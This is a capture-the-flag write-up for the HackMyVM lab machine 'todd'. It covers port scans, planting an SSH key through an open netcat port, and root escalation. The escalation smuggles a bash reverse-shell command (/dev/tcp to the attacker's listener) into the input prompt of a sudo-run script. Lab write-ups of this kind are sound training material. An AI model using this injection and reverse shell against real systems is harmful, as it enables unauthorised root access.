# WriteUp: todd

## Nmap

```java
# Nmap 7.94SVN scan initiated Tue Apr 29 19:04:21 2025 as: nmap -p- --open -sS -vvv --min-rate 5000 -v -Pn -oG puertos 192.168.19.197
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.19.197 () Status: Up
Host: 192.168.19.197 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 5687/open/tcp//gog-multiplayer///, 24393/open/tcp/////, 30216/open/tcp/////   Ignored State: filtered (65530)
# Nmap done at Tue Apr 29 19:05:01 2025 -- 1 IP address (1 host up) scanned in 39.60 seconds
```

```java
# Nmap 7.94SVN scan initiated Tue Apr 29 19:05:36 2025 as: nmap -sCV -p22,80,5687,24393,30216 -oN target 192.168.19.197
Nmap scan report for 192.168.19.197
Host is up (0.00025s latency).

PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp    open     http            Apache httpd 2.4.59 ((Debian))
|_http-title: Mindful Listening
|_http-server-header: Apache/2.4.59 (Debian)
5687/tcp  filtered gog-multiplayer
24393/tcp filtered unknown
30216/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 29 19:05:48 2025 -- 1 IP address (1 host up) scanned in 12.59 seconds
```

---

## Web

<img src="./imagenes/Captura de pantalla 2025-04-29 200233.png">


```bash
❯ sudo nmap -p- --open -sT -vvv --min-rate 5000 -v -Pn 192.168.19.197
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-29 19:18 CEST
Initiating Parallel DNS resolution of 1 host. at 19:18
Completed Parallel DNS resolution of 1 host. at 19:18, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:18
Scanning 192.168.19.197 [65535 ports]
Discovered open port 80/tcp on 192.168.19.197
Discovered open port 22/tcp on 192.168.19.197
Discovered open port 7066/tcp on 192.168.19.197
Increasing send delay for 192.168.19.197 from 0 to 5 due to 11 out of 13 dropped probes since last increase.
Discovered open port 30892/tcp on 192.168.19.197
Discovered open port 6396/tcp on 192.168.19.197
Increasing send delay for 192.168.19.197 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Completed Connect Scan at 19:18, 39.60s elapsed (65535 total ports)
Nmap scan report for 192.168.19.197
Host is up, received user-set (0.012s latency).
Scanned at 2025-04-29 19:18:17 CEST for 40s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
6396/tcp  open  unknown syn-ack
7066/tcp  open  unknown syn-ack
30892/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds
```

---

## Reverse Shell

```bash
nc 192.168.19.197 7066
```

```bash
ssh-keygen
```

```bash
mv ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
```

```lua
Host user
  HostName 192.168.19.197
  Port 22
  IdentityFile ~/.ssh/id_rsa
  User todd
```

```bash
ssh user
```

flag `Todd{eb93009a2719640de486c4f68daf62ec}`

---

## Escalada de privilegios

```bash
sudo -l
```

```java
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```
```bash
nc -lvnp 9000
```

```
sudo /bin/bash /srv/guess_and_check.sh
```

```
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
Please Input [542]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>p[`sh -i >& /dev/tcp/192.168.20.158/9000 0>&1`]
```

root flag `Todd{389c9909b8d6a701217a45104de7aa21}`


**Autor: Xavier Quintero Carrejo**